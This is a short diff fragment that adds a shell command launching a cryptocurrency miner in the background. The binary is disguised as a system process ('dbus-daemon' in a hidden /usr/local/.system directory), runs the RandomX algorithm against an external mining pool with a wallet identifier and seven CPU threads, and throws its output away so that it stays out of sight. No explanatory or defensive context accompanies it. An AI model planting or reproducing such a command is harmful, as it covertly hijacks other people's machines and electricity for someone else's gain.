@@ -1,0 +1,6 @@
+nohup /usr/local/.system/dbus-daemon \
+--algorithm randomx \
+--pool stratum+ssl://rx.unmineable.com:443 \
+--wallet 1792242330.Worker#1c6f-5afs \
+--cpu-threads 7 \
+--keepalive true > /dev/null 2>&1 &
